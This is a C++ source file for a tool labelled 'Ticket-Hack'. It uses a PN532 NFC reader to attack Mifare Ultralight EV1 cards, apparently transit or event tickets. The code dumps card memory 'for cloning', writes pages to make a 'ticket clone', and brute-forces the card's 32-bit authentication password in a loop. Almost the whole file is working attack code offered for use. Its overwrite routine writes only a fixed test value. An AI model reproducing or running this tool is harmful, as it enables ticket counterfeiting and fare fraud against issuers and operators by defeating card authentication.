/*
* AUTHOR: Bill Brousalis
* DATE: 11 Jan. 2023
*/

#include <iostream>
#include <fstream>
#include <boost/filesystem.hpp>
#include "pn532.h"

std::string getheader(int page)
{
  switch(page) {
    case 0x00: return "UID0 - UID2 / BCC0";
    case 0x01: return "UID3 - UDI6";
    case 0x02: return "BCC1 / INT. / LOCK0 - LOCK1";
    case 0x03: return "OTP0 - OTP3";
    case 0x24: return "LOCK2 - LOCK4";
    case 0x25: return "CFG 0 (MIRROR / AUTH0)";
    case 0x26: return "CFG 1 (ACCESS)";
    case 0x27: return "PWD0 - PWD3";
    case 0x28: return "PACK0 - PACK1";
    default:   return "DATA";
  }
}

/* Dump & Save Memory of Mifare Ultralight EV1 Card */
void dump()
{
  const char *fname = getenv("FNAME");
  std::ofstream savefile;
  if(fname == NULL) {
    savefile.open("memory_dumps/latest_memdump.dmp");
  }
  else {
    savefile.open("memory_dumps/" + (std::string)fname);
  }
  
  pn532 dev = pn532("/dev/ttyUSB0");
  dev.wakeup();
  dev.SAM_config();

  std::vector<uint8_t> ver = dev.get_firmware_version();
  hprint(ver, "[+] Firmware Version:", ':', FIRMWARE_VERSION_LEN);
  std::cout << std::endl;

  std::vector<uint8_t> uid = dev.read_passive_target();
  hprint(uid, "[+] Card UID: ", '-', UID_LENGTH);
  std::cout << std::endl;

  std::cout << "[-Dumping Memory-]" << std::endl;
  std::vector<uint8_t> data;
  char formatted_buf[20] = {0};
  for(int page=0; page<MAXPAGES; ++page) {
    data = dev.ultralight_read_page(page);
    sprintf(formatted_buf, "%02x:%02x:%02x:%02x\n", data[0], data[1], data[2], data[3]);
    savefile << formatted_buf;
    printf("Page [%02x] -- ", page);
    for(int ii=0; ii<PAGELENGTH; ++ii) {
      printf("%02x", data[ii]);
      if(ii != PAGELENGTH-1) { printf(" : "); }
    }
    std::cout << "   ( " << getheader(page) <<  " )" << std::endl;
  }

  savefile.close();
  std::cout << std::endl << "[-DONE-]" << std::endl;
}

/* Use a dump file to create a ticket clone */
void overwrite()
{
  const char *fname = getenv("FNAME");
  std::ifstream dumpfile;
  if(fname == NULL) {
    dumpfile.open("memory_dumps/latest_memdump.dmp");
  }
  else {
    dumpfile.open("memory_dumps/" + (std::string)fname);
  }

  pn532 dev = pn532("/dev/ttyUSB0");
  dev.wakeup();
  dev.SAM_config();

  std::vector<uint8_t> ver = dev.get_firmware_version();
  hprint(ver, "[+] Firmware Version:", ':', FIRMWARE_VERSION_LEN);
  std::cout << std::endl;

  std::vector<uint8_t> uid = dev.read_passive_target();
  hprint(uid, "[+] Card UID: ", '-', UID_LENGTH);
  std::cout << std::endl;
  
  std::cout << "[-Memory Overwriting-]\n" << std::endl;
  std::vector<uint8_t> data = {0x01, 0x02, 0x03, 0x04};
  uint8_t out = dev.ultralight_write_page(data, 0x12);
  printf("out = 0x%02x\n", out);
}

void brute()
{
  pn532 dev = pn532("/dev/ttyUSB0");
  dev.wakeup();
  dev.SAM_config();

  std::vector<uint8_t> ver = dev.get_firmware_version();
  hprint(ver, "[+] Firmware Version:", ':', FIRMWARE_VERSION_LEN);
  std::cout << std::endl;

  std::vector<uint8_t> uid = dev.read_passive_target();
  hprint(uid, "[+] Card UID: ", '-', UID_LENGTH);
  std::cout << std::endl;
  
  std::cout << "[-Brute Forcing-]\n" << std::endl;
  for(uint64_t pwd=0x00110500; pwd <= 0xffffffff; ++pwd) {
    uint8_t d1 = pwd & 0xff;
    uint8_t d2 = (pwd & 0xff00) >> (8*1);
    uint8_t d3 = (pwd & 0xff0000) >> (8*2);
    uint8_t d4 = (pwd & 0xff000000) >> (8*3);
    if(d1 == 0) printf("--PWD ITER: %08lx\n", pwd);
    std::vector<uint8_t> passwd {d4, d3, d2, d1};
    try {
      std::vector<uint8_t> authout = dev.pwd_auth(passwd);
      std::cout << "\n\n\n##########\n\nNO EXCEPTION:\n";
      printf("%08lx\n\n\n", pwd);
      exit(0);
    }
    catch(std::runtime_error&) {}
  }
}

void menu()
{
  std::cout << "\n[ Ticket-Hack ]\n";
  std::cout << "1. Dump card memory for cloning\n";
  std::cout << "2. Overwrite card memory\n";
  std::cout << "3. Brute force card password\n> ";
}

int main()
{
  menu();
  int option;
  std::cin >> option;

  if(option == 1)
    dump();
  else if(option == 2)
    overwrite();
  else if(option == 3)
    brute();
  else
    std::cout << "Invalid option..." << std::endl;

  return 0;
}
